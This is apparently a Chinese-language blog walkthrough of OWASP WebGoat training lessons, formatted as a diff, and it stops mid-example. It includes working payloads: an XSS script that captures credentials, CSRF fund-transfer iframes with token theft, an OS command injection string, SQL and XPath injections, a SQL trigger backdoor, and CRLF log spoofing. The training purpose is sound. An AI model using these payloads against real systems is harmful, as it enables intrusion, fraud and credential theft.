+<h4 id="stage-1-3">STAGE 1</h4>
+<p>第一阶段：这个阶段只是为了展示经典的多登录是如何工作的。 你的目标是用密码 tarzan 作为 Jane 进行常规登录。</p>
+<p>输入用户，密码，tank 即可</p>
+<h4 id="stage-2-3">STAGE 2</h4>
+<p>阶段 2：现在你是一个黑客，他已经通过钓鱼邮件从 Jane 窃取了一些信息。 你有密码是 tarzan 和 Tan ＃ 1 是 15648<br />
+问题是，第一个 tan 已经被使用了...试图闯入系统。</p>
+<p>抓包可知有一个参数是 <code>hidden_tan</code>, 改为 1，然后 <code>tan</code> 为 15648</p>
+<h2 id="buffer-overflows">Buffer Overflows</h2>
+<h3 id="off-by-one-overflows">Off-by-One Overflows</h3>
+<p>如何利用缓冲区溢出漏洞</p>
+<p>如何利用基于 Web 的“Off-by-One”缓冲区溢出。<br />
+攻击如何工作：</p>
+<p>尽管更为少见，但当应用程序的一层分配的内存不足以处理用户提交的数据时，Web 上的缓冲区溢出漏洞会发生。 通常情况下，这样的一个层次可以用 C 语言或类似的语言编写。 对于特定的子集，即逐个溢出，本课重点介绍能够覆盖尾随空字节位置的后果。 因此，由于没有找到空字节的事实，进一步的信息被返回给用户。<br />
+课程目标：</p>
+<p>欢迎来到 OWASP 酒店！ 你能找出贵宾住在哪个房间吗？</p>
+<p>了解如何在 Web 应用程序上触发缓冲区溢出漏洞。<br />
+*了解什么类型的值长度可能会引发缓冲区溢出。</p>
+<p>填写用户名，room。然后进入到一个网页，点击 Accept Term 的时候抓包。溢出 <code>room_no</code> 即可，填的数字大一点。查看源码，若返回的有 type='hiden'的&lt;input,</p>
+<p>那么说明溢出成功。然后再随便选一个 vip 的资料，按之前的步骤再做一遍，到 Accept Term 那个网页的时候系统会告诉你，过关了</p>
+<h2 id="code-quality">Code Quality</h2>
+<h3 id="discover-clues-in-the-html">Discover Clues in the HTML</h3>
+<p>开发人员因在源代码中留下诸如 FIXME，TODO，Code Broken，Hack 等等的声明而臭名昭着。 查看源代码以获取任何表示密码，后门或注释的注释都无法正常工作。 以下是基于表单的身份验证表单的示例。 寻找帮助您登录的线索。</p>
+<p>既然是注释的锅，那就看源码咯：发现 <code>&lt;!-- FIXME admin:adminpw  --&gt;</code></p>
+<h2 id="concurrency">Concurrency</h2>
+<h3 id="thread-safety-problems">Thread Safety Problems</h3>
+<p>用户应该能够利用此 Web 应用程序中的并发错误并查看另一个同时尝试相同功能的用户的登录信息。 这将需要使用两个浏览器。 有效的用户名是'jeff'和'dave'。<br />
+请输入您的用户名以访问您的帐户。</p>
+<p>Web 应用程序可以同时处理多个 HTTP 请求。 开发人员经常使用不是线程安全的变量。 线程安全意味着对象或类的字段在由多个线程同时使用时始终保持有效状，态。 通常可以通过在同一时间加载与另一个用户相同的页面来利用并发错误。<br />
+由于所有线程共享相同的方法区域，并且方法区域是所有类变量的存储位置，因此多个线程可以尝试同时使用相同的类变量。</p>
+<p>打开 2 个浏览器模拟 2 个用户，一个输入 <code>dave</code>，一个输入 <code>jeff</code></p>
+<p>新建标签页也行</p>
+<h3 id="shopping-cart-concurrency-flaw">Shopping Cart Concurrency Flaw</h3>
+<p>同上，一个先把贵的物品放入购物车，然后点 purchase；另一个再把便宜的物品放入购物车，点 update cart，然后第一个就可以确认购买了（以第二个的价格</p>
+<h2 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h2>
+<h3 id="phishing-with-xss">Phishing with XSS</h3>
+<p>这题有毒。。明明用的是 POST，难道不是这样的么：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot; http://localhost:8080/WebGoat/catcher?PROPERTY=yes&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;Post&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;admin&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>看了答案才知道是 get 型。。好吧，用 Get 就用 get 吧：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hack</span>(<span class="hljs-params"></span>)&#123; </span><br><span class="language-javascript"><span class="hljs-title class_">XSSImage</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>; <span class="hljs-title class_">XSSImage</span>.<span class="hljs-property">src</span>=<span class="hljs-string">&quot;http://localhost/WebGoat/catcher ？ PROPERTY=yes&amp;user=&quot;</span>+ <span class="hljs-variable language_">document</span>.<span class="hljs-property">phish</span>.<span class="hljs-property">user</span>.<span class="hljs-property">value</span> + <span class="hljs-string">&quot;&amp;password=&quot;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">phish</span>.<span class="hljs-property">pass</span>.<span class="hljs-property">value</span>;&#125; </span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;phish&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">HR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">H3</span>&gt;</span><br>This feature requires account login:&lt;/H3 &gt;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>Enter Username:<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>Enter Password:<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span> = <span class="hljs-string">&quot;pass&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;hack()&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">HR</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>其实这样也可以，不过题目指定要用 js：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot; http://localhost:8080/WebGoat/catcher?PROPERTY=yes&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;admin&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="stored-xss-attacks">Stored XSS Attacks</h3>
+<p>清理所有输入，尤其是稍后将用作 OS 命令，脚本和数据库查询的参数的输入总是一个好习惯。 对于永久存储在应用程序某处的内容而言，这一点尤其重要。 用户不应该能够创建可能导致其他用户在检索到用户消息时加载不需要的页面或不需要的内容的消息内容。</p>
+<p>在 Message 里写入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，然后点击这个链接即可</p>
+<h3 id="lab-cross-site-scripting">LAB: Cross Site Scripting</h3>
+<h4 id="stage-1-4">Stage 1</h4>
+<p>阶段 1：执行存储的跨站点脚本（XSS）攻击。<br />
+作为“汤姆”，在编辑配置文件页面上对 Street 字段执行存储的 XSS 攻击。 确认'Jerry'受到攻击的影响。<br />
+帐户的密码是其给定名称的小写版本（例如，Tom Cat 的密码是“tom”）。</p>
+<p>在 Street 里填入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，更新配置。然后用 Jerry 的账户登陆后，查看 Tom 的档案，这时候就会引发弹窗</p>
+<h4 id="stage-2-4">Stage 2</h4>
+<p>阶段 2：使用输入验证块存储 XSS。</p>
+<p>本课程仅适用于 WEBGOAT 的开发者版本</p>
+<p>在写入数据库之前，实施修复以阻止存储的 XSS。 重复第一阶段，'大卫'作为'埃里克'作为经理。 确认'David'不受此攻击的影响。</p>
+<p>修复内容。做好过滤即可</p>
+<h4 id="stage-3-2">Stage 3</h4>
+<p>阶段 3：执行先前存储的跨站点脚本（XSS）攻击。<br />
+'布鲁斯'员工档案预先加载了存储的 XSS 攻击。 即使第 2 阶段的修复已到位，也要确认'David'受到攻击的影响。</p>
+<p>验证 Bruce 的个人简介中包含有 XSS 攻击，使用 David 用户（密码：david）登录，查看 Bruce 的个人简介，出现弹窗，表明存在 XSS 攻击。</p>
+<h4 id="stage-4-2">Stage 4</h4>
+<p>阶段 4：使用输出编码块存储 XSS。</p>
+<p>本课程仅适用于 WEBGOAT 的开发者版本</p>
+<p>从数据库中读取数据后，实施修复以阻止 XSS。 重复第 3 阶段。确认'大卫'不受布鲁斯配置文件攻击的影响。</p>
+<p>同样，对在数据库里的内容，输出的时候也得过滤</p>
+<h4 id="stage-5-1">Stage 5</h4>
+<p>第 5 阶段<br />
+阶段 5：执行反射 XSS 攻击。<br />
+使用搜索工作人员页面上的漏洞来制作包含反映的 XSS 攻击的 URL。 验证使用该链接的其他员工是否受到此攻击的影响。</p>
+<p>登陆一个人的账户，在搜索框里输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h4 id="stage-6">Stage 6</h4>
+<p>阶段 6：使用输入验证块反射 XSS。</p>
+<p>本课程仅适用于 WEBGOAT 的开发者版本</p>
+<p>实施修复措施以阻止这种反映的 XSS 攻击。 重复步骤 5.确认攻击 URL 不再有效。</p>
+<p>同样做好过滤即可</p>
+<h3 id="reflected-xss-attacks">Reflected XSS Attacks</h3>
+<p>验证服务器端的所有输入总是一个好习惯。 在 HTTP 响应中使用未经验证的用户输入时，可能会发生 XSS。 在反映的 XSS 攻击中，攻击者可以利用攻击脚本制作一个 URL 并将其发布到另一个网站，发送电子邮件或以其他方式让受害者点击它。</p>
+<p>在 <code>access code</code> 中输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 即可</p>
+<h3 id="cross-site-request-forgery-csrf">Cross Site Request Forgery (CSRF)</h3>
+<p>您的目标是发送电子邮件到新闻组。 该电子邮件包含一个图像，其 URL 指向恶意请求。 在本课中，URL 应指向带有课程“Screen”和“menu”参数的“attack”servlet，以及具有任意数值（如 5000）的额外参数“transferFunds”。您可以通过查找“Screen “和”menu“值在右边的参数插入中。 当时发生认证的 CSRF 电子邮件的收件人将转移其资金。 当本课的攻击成功时，左边菜单中的课程名称旁会出现绿色复选标记。</p>
+<p>在 Message 里输入</p>
+<p><code>http://localhost:8080/WebGoat/attack?Screen=2078372&amp;menu=900&amp;transferFunds=5000</code></p>
+<p>提交即可</p>
+<h3 id="csrf-prompt-by-pass">CSRF Prompt By-Pass</h3>
+<p>与 CSRF 课程类似，您的目标是向包含多个恶意请求的新闻组发送电子邮件：第一个传输资金，第二个请求确认第一个请求触发的提示。 这些 URL 应通过此 CSRF-by-pass 课程的屏幕，菜单参数以及具有诸如“5000”之类的数值的额外参数“transferFunds”来指向攻击 servlet 以启动传输并且字符串值“CONFIRM” 完成它。 您可以从右侧的插图复制课程参数以创建格式为</p>
+<p><code>attack?Screen=XXX&amp;menu=YYY&amp;transferFunds=ZZZ</code></p>
+<p>的网址。 无论谁收到这封电子邮件并恰好在那个时候进行认证，他的资金都将被转移。 当您认为攻击成功时，刷新页面，您会在左侧菜单中找到绿色检查。</p>
+<p>该实验有两个要求，第一是包含恶意请求，第二是确认第一个要求是否攻击成功。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span></span><br><span class="hljs-tag">    <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;attack?Screen=1471017872&amp;menu=900&amp;transferFunds=5000&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span></span><br><span class="hljs-tag">    <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;attack?Screen=1471017872&amp;menu=900&amp;transferFunds=CONFIRM&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+<h3 id="csrf-token-by-pass">CSRF Token By-Pass</h3>
+<p>与 CSRF 课程类似，您的目标是向包含恶意请求转移资金的新闻组发送电子邮件。 要成功完成，您需要获取有效的请求令牌。 显示转帐资金表单的页面包含有效的请求令牌。 转账资金页面的 URL 是带有本课“屏幕”和“菜单”查询参数以及额外参数“transferFunds = main”的“攻击”servlet。 加载此页面，读取令牌并将令牌附加到 transferFunds 的伪造请求中。 当您认为攻击成功时，刷新页面，您会在左侧菜单中找到绿色检查。</p>
+<p>这题稍微复杂了一点。首先要嵌入一个框架（F1），在 F1 中找 Token，然后在嵌入第二个框架（F2），这个框架是转帐的链接，需要带上 token，思路就是这样。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">GetToken</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> token = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;F1&#x27;</span>).<span class="hljs-property">contentDocument</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;form&#x27;</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>].<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-title class_">LoadF2</span>(token);</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LoadF2</span>(<span class="hljs-params">token</span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;F2&#x27;</span>).<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;attack?Screen=803158781&amp;menu=900&amp;transferFunds=5000&amp;CSRFToken=&#x27;</span>+token;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;attack?Screen=803158781&amp;menu=900&amp;transferFunds=main&#x27;</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&#x27;GetToken()&#x27;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;F1&#x27;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;F2&#x27;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="httponly-test">HTTPOnly Test</h3>
+<p>为了帮助缓解跨站脚本威胁，微软推出了一个名为“HttpOnly”的新 cookie 属性。 如果设置了该标志，那么浏览器不应允许客户端脚本访问 cookie。 由于该属性相对较新，因此一些浏览器忽略正确处理新属性。</p>
+<p>本课的目的是测试您的浏览器是否支持 HTTPOnly cookie 标志。 请注意 unique2u cookie 的值。 如果您的浏览器支持 HTTPOnly，并且您为 cookie 启用它，则客户端代码应该无法读取或写入该 cookie，但浏览器仍然可以将其值发送到服务器。 某些浏览器仅阻止客户端读取访问，但不阻止写入访问。</p>
+<p>这题是让我们尝试 httponly 的，试一试就好了</p>
+<h2 id="improper-error-handling">Improper Error Handling</h2>
+<h3 id="fail-open-authentication-scheme">Fail Open Authentication Scheme</h3>
+<p>由于认证机制中存在错误处理问题，因此可以在不输入密码的情况下将其认证为'webgoat'用户。 尝试以 Webgoat 用户身份登录，而不指定密码。</p>
+<p>有时候我们在服务端接受客户端数据的时候并没有判断这个参数是否存在就对其直接使用，这是很不安全的，因为往往会由于参数的缺少而引发意外的异常，可能导致任意用户登陆。</p>
+<p>抓包删除 <code>Password</code> 参数，提交即可</p>
+<h2 id="injection-flaws">Injection Flaws</h2>
+<h3 id="command-injection">Command Injection</h3>
+<p>命令注入攻击对任何参数驱动的站点都构成严重威胁。 攻击背后的方法很容易学习，而造成的破坏可能包括相当多的系统妥协。 尽管存在这些风险，但互联网上数量惊人的系统易受这种攻击形式的影响。</p>
+<p>这不仅是一个容易引发威胁的威胁，它也是一种威胁，凭借一点常识和深思熟虑，几乎可以完全防止。 本课将向学生展示几个参数注入的例子。<br />
+清理所有输入数据，特别是用于操作系统命令，脚本和数据库查询的数据总是一个很好的做法。<br />
+尝试向操作系统注入命令。</p>
+<p>bs 抓包，改 HelpFile 参数：</p>
+<p><code>AccessControlMatrix.help" %26 netstat -an %26 ifconfig%26 echo"</code></p>
+<p>注意，逃逸双引号的同时注意闭合，以及这题的命令执行不能有错误，否则就算你拿到了命令执行后的信息也过不了，比如：</p>
+<p><code>AccessControlMatrix.help" %26 netstat -an %26 ifconfig%26"</code></p>
+<p>这样的 payload 是过不了的。</p>
+<h3 id="numeric-sql-injection">Numeric SQL Injection</h3>
+<p>SQL 注入攻击对任何数据库驱动的站点都构成严重威胁。 攻击背后的方法很容易学习，而造成的破坏可能包括相当多的系统妥协。 尽管存在这些风险，互联网上数量惊人的系统容易受到这种攻击形式的影响。</p>
+<p>这不仅是一个容易受到煽动的威胁，而且它也是一种威胁，可以轻易防止，有一点常识和深思熟虑。</p>
+<p>对所有输入数据进行清理，尤其是在操作系统命令，脚本和数据库查询中使用的数据，即使 SQL 注入的威胁以其他方式阻止，也是一种很好的做法。</p>
+<p>数字型 sql 注入，连 sql 语句都给了，不能再简单</p>
+<p><code>1 or 1=1--+</code></p>
+<h3 id="log-spoofing">Log Spoofing</h3>
+<p>下面的灰色区域表示将在 Web 服务器的日志文件中记录的内容。<br />
+你的目标是使它像一个用户名“admin”登录成功。<br />
+通过向日志文件添加脚本来提升攻击？</p>
+<p>利用换行，造成登陆成功的假象：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Smith</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aLogin Succeeded for username: admin<br></code></pre></td></tr></table></figure>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">0</span>a 换行符号 <span class="hljs-string">&quot;<span class="hljs-char escape_">\n</span>&quot;</span><br><span class="hljs-number">0</span>d 回车符号 <span class="hljs-string">&quot;<span class="hljs-char escape_">\r</span>&quot;</span><br></code></pre></td></tr></table></figure>
+<p>其实我觉得这样也行，但是通过不了：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">form</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;table&#x27;</span>)[<span class="hljs-number">1</span>].<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;td&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;pre&#x27;</span>)[<span class="hljs-string">&quot;0&quot;</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-string">&quot;0&quot;</span>].<span class="hljs-property">data</span>=<span class="hljs-string">&#x27;Login Succeeded for username: admin&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>原因应该是这个日志不是在网页端欺骗，而是在日志中达到欺骗的效果</p>
+<h3 id="xpath-injection">XPATH Injection</h3>
+<p>与 SQL 注入类似，当网站使用用户提供的信息查询 XML 数据时，会发生 XPATH 注入攻击。 通过向网站发送有故意的畸形信息，攻击者可以了解 XML 数据的结构或访问他们通常无法访问的数据。 如果 xml 数据用于身份验证（如基于 xml 的用户文件），他们甚至可以提升网站上的权限。 查询 XML 是使用 XPath 完成的，XPath 是一种简单的描述性语句，它允许 xml 查询定位一条信息。 像 SQL 一样，您可以指定某些属性来查找和匹配模式。 在网站上使用 XML 时，通常接受查询字符串的某种形式的输入以标识要在页面上定位和显示的内容。 必须对此输入进行消毒，以验证它不会混淆 XPath 查询并返回错误的数据。</p>
+<p>下面的表格允许员工看到他们的所有个人数据，包括他们的工资。 您的帐户是 Mike / test123。 您的目标是尝试查看其他员工数据。</p>
+<p>Xpath 注入，抓包改 Username：</p>
+<p><code>Mike' or 1 or '1</code></p>
+<h3 id="lab-sql-injection">LAB: SQL Injection</h3>
+<h4 id="stage-1-5">Stage 1</h4>
+<p>阶段 1：使用字符串 SQL 注入绕过验证。 使用 SQL 注入作为老板（'Neville'）登录而不使用正确的密码。 验证 Neville 的个人资料可以被查看，并且所有功能都可用（包括搜索，创建和删除）。</p>
+<p><code>1' or 1=1 -- +#</code></p>
+<p>密码框有长度限制，抓包</p>
+<h4 id="stage-2-5">Stage 2</h4>
+<p>这题是修复题，利用参数化来预防 SQL 注入，是一个比较常见的防止注入的方式</p>
+<h4 id="stage-3-3">Stage 3</h4>
+<p>作为普通员工'Larry'，使用 SQL 注入到 View 函数的参数（从 List Staff 页面）来查看老板的简介（'Neville'）。</p>
+<p>首先绕过登陆，然后点 View 的时候抓包，在 employee_id 中注入：</p>
+<p><code>112  or 1=1 order by salary desc</code></p>
+<p>这题有点坑，需要的先验知识很多。。</p>
+<h3 id="string-sql-injection">String SQL Injection</h3>
+<p>payload: <code>Smith' or 1=1-- +#</code></p>
+<h3 id="database-backdoors">Database Backdoors</h3>
+<h4 id="stage-1-6">Stage 1</h4>
+<p>阶段 1：使用字符串 SQL 注入来执行多个 SQL 语句。 本课的第一阶段是教您如何使用易受攻击的字段创建两条 SQL 语句。 第一个是系统，第二个完全是你的。 您的帐户 ID 为 101.此页面允许您查看密码，ssn 和工资。 尝试注入另一个更新来更新薪水</p>
+<p>堆叠注入</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">101; update employee <span class="hljs-built_in">set</span> <span class="hljs-attribute">salary</span>=100000000 where <span class="hljs-attribute">userid</span>=101 -- +#<br></code></pre></td></tr></table></figure>
+<h4 id="stage-2-6">Stage 2</h4>
+<p>阶段 2：使用字符串 SQL 注入来注入后门。 本课的第二阶段是教你如何使用一个弱点字段来注入数据库工作或后门。 现在尝试使用相同的技术来注入一个充当 SQL 后门的触发器，触发器的语法是：<br />
+<code>CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com' WHERE userid = NEW.userid</code><br />
+请注意，由于当前底层数据库不支持触发器，因此不会执行任何操作。</p>
+<p>按照提示，输入：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">101</span>;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> myBackDoor <span class="hljs-keyword">BEFORE</span> <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> employee <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">EACH</span> <span class="hljs-keyword">ROW</span> <span class="hljs-keyword">BEGIN</span> <span class="hljs-keyword">UPDATE</span> employee <span class="hljs-keyword">SET</span> email=<span class="hljs-string">&#x27;john@hackme.com&#x27;</span> <span class="hljs-keyword">WHERE</span> userid = <span class="hljs-built_in">NEW</span>.userid<br></code></pre></td></tr></table></figure>
+<h3 id="blind-numeric-sql-injection">Blind Numeric SQL Injection</h3>
+<p>下面的表格允许用户输入一个帐号并确定它是否有效。 使用此表单开发真/假测试检查数据库中的其他条目。</p>
+<p>目标是找到 cc_number 为 1111222233334444 的行表格引脚中字段引脚的值。该字段的类型为 int，它是一个整数。</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs abnf">判断长度<br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and length(pin)=4-- 